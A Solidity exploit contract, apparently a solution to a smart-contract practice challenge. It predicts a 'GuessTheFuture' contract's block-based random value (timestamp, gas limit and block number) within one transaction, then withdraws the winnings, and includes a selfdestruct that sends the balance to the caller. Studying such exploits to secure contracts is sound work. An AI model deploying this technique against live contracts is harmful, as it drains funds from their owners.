// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.0;

interface GuessTheFuture {
    function guessTheFuture(uint256) external returns (bool);
    function withdraw() external;
}

contract AttackTheFuture {
    constructor(address payable _address) {
        GuessTheFuture gtf = GuessTheFuture(_address);
        gtf.guessTheFuture(block.timestamp ^ block.gaslimit ^ block.number);
        gtf.withdraw();
    }
    
    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}